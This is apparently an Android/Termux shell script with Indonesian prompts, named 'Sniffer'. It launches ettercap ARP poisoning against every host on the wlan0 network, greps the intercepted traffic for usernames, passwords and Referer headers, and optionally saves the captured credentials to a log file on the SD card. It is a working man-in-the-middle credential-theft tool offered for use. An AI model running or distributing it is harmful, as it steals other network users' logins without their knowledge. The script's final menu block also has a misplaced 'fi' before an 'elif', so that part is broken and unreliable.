#!/system/bin/sh

echo "   
        \033[32;1m..::|[ Sniffer ]|::.. \033[0m
"
echo -n "[?] Simpan Log ke FILE? (y)ya/(g)gak :"
read takon
echo "\n=> Pilihan: $takon"

if [ $takon = y ] || [ $takon = Y ]
then
echo -n "=> Masukan Nama File Log: "
read aran
echo "\n=> Nama File LOG: \033[33m$aran.txt\033[0m"
echo "\033[1;31m[!] Tekan SPASI Spasi Setelah Loading 100%!\033[0m"
echo "[!] Tekan \033[1;33mQ\033[0m Untuk Berhenti" 
./ettercap -i wlan0 // // -qT -M ARP | egrep -e 'Referer: |username*=|password=|user*=|pass*=|username=|passwords=' > $aran.txt
echo "\n=> Tersimpan Di : /sdcard/simpenan/$aran.txt"
cd /
busybox mv data/ettercap/$aran.txt /sdcard/simpenan/

elif [ $takon = g ] || [ $takon = G ]
then
echo "\n
\033[1;31m[!] Tekan Tombol SPASI Setelah Loading 100%!\033[0m"
echo "[!] Tekan \033[1;33mQ\033[0m Untuk Berhenti" 
./ettercap -i wlan0 // // -qT -M ARP | egrep -e 'Referer: |username*=|password=|user*=|pass*=|username=|passwords='
fi
echo "\n[#] Sniffing Dihentikan.. \n"

echo "
=> Tekan \033[33mB\033[0m untuk kembali
=> Tekan \033[31mK\033[0m untuk keluar"
echo -n "=> Pilihan: "
read upil
if [ $upil = b ] || [ $upil = B ]
then
clear
sh /data/data/com.termux/files/home/start
fi
elif [ $upil = k ] || [ $upil = K ]
then
clear
fi


